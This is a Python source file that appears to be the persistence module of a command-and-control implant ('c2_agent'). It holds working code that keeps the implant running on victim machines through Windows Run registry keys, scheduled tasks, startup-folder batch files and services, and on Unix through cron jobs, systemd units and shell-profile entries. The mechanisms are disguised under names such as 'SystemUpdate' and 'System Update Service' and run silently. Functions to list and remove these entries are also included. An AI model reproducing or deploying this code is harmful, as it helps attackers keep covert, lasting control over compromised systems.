# agent/modules/persistence.py
import os
import sys
import platform
import subprocess
import shutil
import tempfile
from typing import Dict, Any, List, Optional


class Persistence:
    """Persistence mechanisms module"""
    
    def __init__(self, agent):
        self.agent = agent
        self.commands = {
            'install': self.install_persistence,
            'remove': self.remove_persistence,
            'list': self.list_persistence,
            'startup': self.add_startup,
            'service': self.create_service,
            'scheduled': self.create_scheduled_task,
            'registry': self.add_registry_key,
            'cron': self.add_cron_job
        }
    
    def execute(self, command: str, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Execute persistence command"""
        if command in self.commands:
            try:
                result = self.commands[command](parameters)
                return {'success': True, 'result': result}
            except Exception as e:
                return {'success': False, 'error': str(e)}
        else:
            return {'success': False, 'error': f'Unknown command: {command}'}
    
    def install_persistence(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Install persistence based on OS"""
        method = params.get('method', 'auto')
        
        results = []
        
        if method == 'auto':
            # Try multiple methods
            if platform.system() == 'Windows':
                methods = ['registry', 'scheduled', 'startup']
            else:
                methods = ['cron', 'service', 'startup']
            
            for m in methods:
                try:
                    result = self._install_method(m, params)
                    results.append({
                        'method': m,
                        'success': True,
                        'details': result
                    })
                except Exception as e:
                    results.append({
                        'method': m,
                        'success': False,
                        'error': str(e)
                    })
        else:
            # Specific method
            try:
                result = self._install_method(method, params)
                results.append({
                    'method': method,
                    'success': True,
                    'details': result
                })
            except Exception as e:
                results.append({
                    'method': method,
                    'success': False,
                    'error': str(e)
                })
        
        return {
            'installed': any(r['success'] for r in results),
            'methods': results
        }
    
    def _install_method(self, method: str, params: Dict[str, Any]) -> Dict[str, Any]:
        """Install specific persistence method"""
        if method == 'registry':
            return self.add_registry_key(params)
        elif method == 'scheduled':
            return self.create_scheduled_task(params)
        elif method == 'service':
            return self.create_service(params)
        elif method == 'startup':
            return self.add_startup(params)
        elif method == 'cron':
            return self.add_cron_job(params)
        else:
            raise Exception(f"Unknown persistence method: {method}")
    
    def remove_persistence(self, params: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Remove installed persistence"""
        removed = []
        
        # Check all common persistence locations
        if platform.system() == 'Windows':
            # Registry
            try:
                import winreg
                keys = [
                    (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
                    (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run"),
                ]
                
                for hkey, subkey in keys:
                    try:
                        key = winreg.OpenKey(hkey, subkey, 0, winreg.KEY_ALL_ACCESS)
                        i = 0
                        while True:
                            try:
                                name, value, _ = winreg.EnumValue(key, i)
                                if sys.executable in value or 'c2_agent' in name.lower():
                                    winreg.DeleteValue(key, name)
                                    removed.append({
                                        'type': 'registry',
                                        'location': f"{hkey}\\{subkey}\\{name}"
                                    })
                                else:
                                    i += 1
                            except WindowsError:
                                break
                        winreg.CloseKey(key)
                    except:
                        pass
            except ImportError:
                pass
            
            # Scheduled tasks
            try:
                output = subprocess.check_output(['schtasks', '/query', '/fo', 'csv'], text=True)
                for line in output.split('\n'):
                    if 'c2_agent' in line.lower():
                        task_name = line.split(',')[0].strip('"')
                        subprocess.run(['schtasks', '/delete', '/tn', task_name, '/f'])
                        removed.append({
                            'type': 'scheduled_task',
                            'name': task_name
                        })
            except:
                pass
                
        else:
            # Cron jobs
            try:
                crontab = subprocess.check_output(['crontab', '-l'], text=True)
                new_cron = []
                for line in crontab.split('\n'):
                    if 'c2_agent' not in line and sys.executable not in line:
                        new_cron.append(line)
                    else:
                        removed.append({
                            'type': 'cron',
                            'entry': line
                        })
                
                if len(new_cron) < len(crontab.split('\n')):
                    # Update crontab
                    with tempfile.NamedTemporaryFile(mode='w', delete=False) as f:
                        f.write('\n'.join(new_cron))
                        f.flush()
                        subprocess.run(['crontab', f.name])
                        os.unlink(f.name)
            except:
                pass
            
            # Systemd services
            try:
                services = subprocess.check_output(['systemctl', 'list-units', '--type=service'], text=True)
                for line in services.split('\n'):
                    if 'c2_agent' in line:
                        service_name = line.split()[0]
                        subprocess.run(['systemctl', 'stop', service_name])
                        subprocess.run(['systemctl', 'disable', service_name])
                        service_file = f'/etc/systemd/system/{service_name}'
                        if os.path.exists(service_file):
                            os.remove(service_file)
                        removed.append({
                            'type': 'service',
                            'name': service_name
                        })
            except:
                pass
        
        return removed
    
    def list_persistence(self, params: Dict[str, Any]) -> List[Dict[str, Any]]:
        """List current persistence mechanisms"""
        persistence = []
        
        if platform.system() == 'Windows':
            # Check registry
            try:
                import winreg
                keys = [
                    (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", "HKCU"),
                    (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run", "HKLM"),
                ]
                
                for hkey, subkey, name in keys:
                    try:
                        key = winreg.OpenKey(hkey, subkey, 0, winreg.KEY_READ)
                        i = 0
                        while True:
                            try:
                                value_name, value_data, _ = winreg.EnumValue(key, i)
                                persistence.append({
                                    'type': 'registry',
                                    'location': f"{name}\\{subkey}",
                                    'name': value_name,
                                    'value': value_data
                                })
                                i += 1
                            except WindowsError:
                                break
                        winreg.CloseKey(key)
                    except:
                        pass
            except ImportError:
                pass
            
            # Check scheduled tasks
            try:
                output = subprocess.check_output(['schtasks', '/query', '/v', '/fo', 'csv'], text=True)
                lines = output.split('\n')
                if lines:
                    headers = lines[0].split(',')
                    for line in lines[1:]:
                        if line.strip():
                            values = line.split(',')
                            if len(values) >= 2:
                                persistence.append({
                                    'type': 'scheduled_task',
                                    'name': values[0].strip('"'),
                                    'next_run': values[1].strip('"') if len(values) > 1 else 'N/A'
                                })
            except:
                pass
                
        else:
            # Check cron
            try:
                crontab = subprocess.check_output(['crontab', '-l'], text=True)
                for line in crontab.split('\n'):
                    if line.strip() and not line.startswith('#'):
                        persistence.append({
                            'type': 'cron',
                            'entry': line
                        })
            except:
                pass
            
            # Check systemd services
            try:
                output = subprocess.check_output(['systemctl', 'list-unit-files', '--type=service'], text=True)
                for line in output.split('\n'):
                    if line.strip():
                        parts = line.split()
                        if len(parts) >= 2:
                            persistence.append({
                                'type': 'service',
                                'name': parts[0],
                                'status': parts[1]
                            })
            except:
                pass
        
        return persistence
    
    def add_startup(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Add to startup folder"""
        name = params.get('name', 'SystemUpdate')
        
        if platform.system() == 'Windows':
            # Windows startup folder
            import getpass
            startup_dir = os.path.join(
                'C:\\Users',
                getpass.getuser(),
                'AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
            )
            
            if not os.path.exists(startup_dir):
                os.makedirs(startup_dir)
            
            # Create batch file
            batch_file = os.path.join(startup_dir, f'{name}.bat')
            with open(batch_file, 'w') as f:
                f.write(f'@echo off\n')
                f.write(f'start /B "{sys.executable}" "{os.path.abspath(sys.argv[0])}"\n')
            
            return {
                'method': 'startup_folder',
                'path': batch_file
            }
            
        else:
            # Unix/Linux - add to shell profile
            shell = os.environ.get('SHELL', '/bin/bash')
            
            if 'bash' in shell:
                profile = os.path.expanduser('~/.bashrc')
            elif 'zsh' in shell:
                profile = os.path.expanduser('~/.zshrc')
            else:
                profile = os.path.expanduser('~/.profile')
            
            # Add to profile
            with open(profile, 'a') as f:
                f.write(f'\n# {name}\n')
                f.write(f'nohup "{sys.executable}" "{os.path.abspath(sys.argv[0])}" >/dev/null 2>&1 &\n')
            
            return {
                'method': 'shell_profile',
                'path': profile
            }
    
    def create_service(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Create system service"""
        name = params.get('name', 'system-update')
        description = params.get('description', 'System Update Service')
        
        if platform.system() == 'Windows':
            # Windows service
            try:
                # Create service using sc command
                cmd = [
                    'sc', 'create', name,
                    'binPath=', f'"{sys.executable}" "{os.path.abspath(sys.argv[0])}"',
                    'start=', 'auto',
                    'DisplayName=', description
                ]
                
                subprocess.run(cmd, check=True)
                subprocess.run(['sc', 'start', name])
                
                return {
                    'method': 'windows_service',
                    'name': name,
                    'status': 'created'
                }
                
            except subprocess.CalledProcessError as e:
                raise Exception(f"Failed to create service: {e}")
                
        else:
            # Systemd service
            service_content = f"""[Unit]
Description={description}
After=network.target

[Service]
Type=simple
ExecStart={sys.executable} {os.path.abspath(sys.argv[0])}
Restart=always
RestartSec=30

[Install]
WantedBy=multi-user.target
"""
            
            service_file = f'/etc/systemd/system/{name}.service'
            
            try:
                # Write service file
                with open(service_file, 'w') as f:
                    f.write(service_content)
                
                # Enable and start service
                subprocess.run(['systemctl', 'daemon-reload'])
                subprocess.run(['systemctl', 'enable', name])
                subprocess.run(['systemctl', 'start', name])
                
                return {
                    'method': 'systemd_service',
                    'name': name,
                    'path': service_file,
                    'status': 'active'
                }
                
            except Exception as e:
                raise Exception(f"Failed to create service: {e}")
    
    def create_scheduled_task(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Create scheduled task"""
        name = params.get('name', 'SystemUpdate')
        interval = params.get('interval', 60)  # minutes
        
        if platform.system() == 'Windows':
            # Windows Task Scheduler
            try:
                cmd = [
                    'schtasks', '/create',
                    '/tn', name,
                    '/tr', f'"{sys.executable}" "{os.path.abspath(sys.argv[0])}"',
                    '/sc', 'minute',
                    '/mo', str(interval),
                    '/f'  # Force
                ]
                
                subprocess.run(cmd, check=True)
                
                return {
                    'method': 'scheduled_task',
                    'name': name,
                    'interval': interval
                }
                
            except subprocess.CalledProcessError as e:
                raise Exception(f"Failed to create scheduled task: {e}")
        else:
            # Use cron instead
            return self.add_cron_job(params)
    
    def add_registry_key(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Add Windows registry key for persistence"""
        if platform.system() != 'Windows':
            raise Exception("Registry persistence is Windows-only")
        
        try:
            import winreg
        except ImportError:
            raise Exception("winreg module not available")
        
        name = params.get('name', 'SystemUpdate')
        hive = params.get('hive', 'HKCU')  # HKCU or HKLM
        
        # Select registry hive
        if hive == 'HKLM':
            key_hive = winreg.HKEY_LOCAL_MACHINE
        else:
            key_hive = winreg.HKEY_CURRENT_USER
        
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
        
        try:
            # Open or create key
            key = winreg.OpenKey(key_hive, subkey, 0, winreg.KEY_WRITE)
            
            # Set value
            value = f'"{sys.executable}" "{os.path.abspath(sys.argv[0])}"'
            winreg.SetValueEx(key, name, 0, winreg.REG_SZ, value)
            
            winreg.CloseKey(key)
            
            return {
                'method': 'registry',
                'hive': hive,
                'key': subkey,
                'name': name,
                'value': value
            }
            
        except Exception as e:
            raise Exception(f"Failed to add registry key: {e}")
    
    def add_cron_job(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Add cron job for persistence"""
        if platform.system() == 'Windows':
            raise Exception("Cron is not available on Windows")
        
        interval = params.get('interval', 60)  # minutes
        
        # Create cron entry
        if interval < 60:
            schedule = f"*/{interval} * * * *"
        else:
            hours = interval // 60
            schedule = f"0 */{hours} * * *"
        
        command = f'{sys.executable} {os.path.abspath(sys.argv[0])}'
        cron_entry = f"{schedule} {command} >/dev/null 2>&1"
        
        try:
            # Get current crontab
            try:
                current_cron = subprocess.check_output(['crontab', '-l'], text=True)
            except subprocess.CalledProcessError:
                current_cron = ""
            
            # Check if already exists
            if command in current_cron:
                return {
                    'method': 'cron',
                    'status': 'already_exists',
                    'entry': cron_entry
                }
            
            # Add new entry
            new_cron = current_cron.rstrip() + '\n' + cron_entry + '\n'
            
            # Write new crontab
            with tempfile.NamedTemporaryFile(mode='w', delete=False) as f:
                f.write(new_cron)
                f.flush()
                
                subprocess.run(['crontab', f.name], check=True)
                os.unlink(f.name)
            
            return {
                'method': 'cron',
                'status': 'added',
                'entry': cron_entry,
                'schedule': schedule
            }
            
        except Exception as e:
            raise Exception(f"Failed to add cron job: {e}")
